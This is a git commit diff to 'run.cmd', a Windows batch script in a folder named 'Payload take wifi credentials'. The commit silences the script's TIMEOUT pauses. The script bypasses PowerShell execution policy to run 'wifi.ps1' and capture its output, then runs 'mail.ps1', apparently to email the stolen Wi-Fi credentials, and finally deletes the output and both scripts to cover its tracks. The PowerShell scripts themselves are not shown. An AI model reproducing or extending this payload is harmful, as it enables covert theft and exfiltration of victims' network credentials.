e45233d7e926d426ca7203e9ead8135a93ea01cc
RevoVog <vihanga.vog@gmail.com>
2025-09-03 00:46:48 +0530

    Fix TIMEOUT command to suppress output in run.cmd

--- Payload take wifi credentials/run.cmd
+++ Payload take wifi credentials/run.cmd
@@ -1,8 +1,8 @@
 @echo off
 powershell.exe -ExecutionPolicy Bypass -File "wifi.ps1" > output.txt
-TIMEOUT /T 5
+TIMEOUT /T 5 /NOBREAK > NUL
 powershell.exe -ExecutionPolicy Bypass -File "mail.ps1"
-TIMEOUT /T 5
+TIMEOUT /T 5 /NOBREAK > NUL
 del output.txt
 del wifi.ps1
 del mail.ps1
